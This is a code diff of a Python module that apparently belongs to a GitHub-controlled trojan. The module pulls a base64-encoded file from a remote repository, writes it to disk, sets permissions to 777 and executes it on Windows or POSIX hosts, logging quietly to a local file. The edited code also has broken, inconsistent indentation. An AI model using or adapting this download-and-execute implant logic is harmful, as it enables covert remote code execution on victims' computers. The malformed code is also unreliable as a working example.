@@ -3,9 +3,10 @@ import json
 import base64
 import os
 
-scriptPath = "scripts/test.txt" #"modules/dirlister.py" #
-folder = scriptPath.rstrip("test.txt")
-bin = False
+filePath = "bin/test" #"modules/dirlister.py" #
+folder = filePath.rstrip("test")
+encodedFiles  = False
+bin = True
 start = True
 scriptExec = "python "
 def connect_to_github():
@@ -15,46 +16,52 @@ def connect_to_github():
 	return gh,repo,branch
 
 def get_file_contents(filepath):
-	gh,repo,branch = connect_to_github()
-	tree = branch.commit.commit.tree.to_tree().recurse()
-	for filename in tree.tree:
-		if filepath in filename.path:
-			print("[OK] Found file %s" % filepath)
-			blob = repo.blob(filename._json_data['sha']) #Hashed content
-			return blob.content
+	try:
+		gh,repo,branch = connect_to_github()
+		tree = branch.commit.commit.tree.to_tree().recurse()
+		for filename in tree.tree:
+			if filepath in filename.path:
+				print("[OK] Found file %s" % filepath)
+				blob = repo.blob(filename._json_data['sha']) #Hashed content
+				if encodedFiles:
+					return base64.b64decode(blob.content)
+				return blob.content
+	except:
+		print("exception raised!")
 	return None
 
 
 def run(**args): # Must import its personal lib, git_tro will execute this module in # environment
-	script	= get_file_contents(scriptPath)
-	#content = None
+	print("[*] In getFileFromGit module.") #Todelete
+	script	= get_file_contents(filePath)
+	ch = ""
 	if script is not None:
-		content	= base64.b64decode(base64.b64decode(script))
-		print content
+		content	= base64.b64decode(script)
+		print folder
 		try:
 			os.makedirs(folder, mode=777)
 		except:
 			os.system("echo 'getRunScript: folder %s exists' >> Tapalog.log"%folder)
 		if bin:
-        	fich = open(scriptPath, "wb")
-			fich.write(content)
-			fich.close()
+			fich = open(filePath, "wb")
+				fich.write(content)
+				fich.close()
 			if start and os.name == 'nt':
-                  os.system("start {}".format(scriptPath))
-          	elif start and os.name == 'posix':
-                  os.system("chmod 777 {}".format(scriptPath))
-                  os.system("./{}".format(scriptPath))
-          	else:
-                  os.system("echo 'Non-recognized OS' >> Tapalog.log")
-
+		          os.system("start {}".format(filePath))
+		  	elif start and os.name == 'posix':
+		          os.system("chmod 777 {}".format(filePath))
+		          os.system("./{}".format(filePath))
+		  	else:
+		          os.system("echo 'Non-recognized OS' >> Tapalog.log")
         else:
-            fich = open(scriptPath, "w")
-			fich.write(content)
+            fich = open(filePath, "w")
+			fich.write(content.decode())
 			fich.close()
-			os.system(scriptExec+" "+scriptPath)
+			os.system(scriptExec+" "+filePath)
+		ch = str("getRunScript: file {} successfully started".format(filePath))
 	else:
 		#TODO: Customize log file path
-		os.system("echo 'getRunScript: Unable to find file {}' >> Tapalog.log".format(scriptPath))
-		return None
-	return 
+		#os.system("echo 'getRunScript: Unable to find file {}' >> Tapalog.log".format(filePath))
+		ch = str("getRunScript: Unable to find script {}".format(filePath))
+	return ch
 
